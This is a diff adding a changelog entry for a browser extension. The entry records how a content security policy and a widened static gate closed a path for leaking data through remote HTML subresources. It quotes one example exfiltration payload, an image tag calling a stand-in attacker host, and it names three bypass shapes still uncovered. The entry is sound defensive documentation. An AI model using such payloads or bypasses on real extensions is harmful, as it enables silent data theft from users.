@@ -2,6 +2,33 @@
 
 ## Unreleased
 
+- [done] Closed the HTML remote-subresource egress path (2026-07-26). PR #41 taught the gate to read
+  `<script>` tags; everything else in `src/**/*.html` still passed both halves unread, and
+  `<img src="https://evil.example/p.gif?d=leak">` was verified green. That was live, not merely
+  theoretical: the manifest declared no CSP, so MV3's default restricts executable code only and left
+  `<img>`/`<iframe>`/`<form action>`/CSS `url()` free to reach any origin from the options page.
+
+  Two controls now, deliberately layered. The **primary** one is a real
+  `content_security_policy.extension_pages` in `manifest.config.ts` — `script-src`/`object-src`/
+  `img-src`/`media-src`/`font-src 'self'`, `style-src 'self' 'unsafe-inline'`, `frame-src`/
+  `form-action`/`base-uri 'none'` — which blocks the fetch rather than merely noticing it. Measured
+  on the loaded unpacked build, not assumed: a remote `<img>`, a remote `<iframe>` and a remote CSS
+  `@import` each produced their directive's violation, an in-package image still loaded, and the
+  page's inline `<style>` and module script were unaffected (`docs/live-dom-verification.md`).
+  `connect-src` is left unset for crxjs's dev HMR; the JS half already forbids the primitives.
+
+  The **backup** is the static gate, widened from `<script src>` to every attribute a browser
+  fetches from with no user action — `src`, `srcset`, `poster`, `data`, `action`, `formaction`,
+  `href` on `<link>`/`<base>` — plus CSS `url()` and `@import`. Two calls made explicitly rather
+  than by default: `<a href>` is NOT checked (user navigation, not a fetch, so a legitimate outbound
+  link cannot redden the gate) and `data:` IS rejected. Every payload was diffed against happy-dom
+  instead of reasoned about, including the tokenization shapes that produced five false negatives in
+  the `<script>` half; both the gate and the CSP assertion were verified to fail under targeted
+  neutralization. QA's attack found three vectors that remain uncovered statically — an
+  entity-escaped scheme, SVG `<image xlink:href>`, and `<meta http-equiv="refresh">` — recorded in
+  `tasks.md` and disclosed in `docs/conventions.md` rather than papered over; the CSP covers the
+  first two at runtime, and the third has no directive left to add.
+
 - [done] Closed the privacy gate's HTML residual (2026-07-26). The `src/`-wide widening fixed
   which directories are walked, not which file types are read: the collector matched
   `.tsx?|jsx?|mjs|cjs`, so `src/options/index.html` — the one HTML file this extension ships —
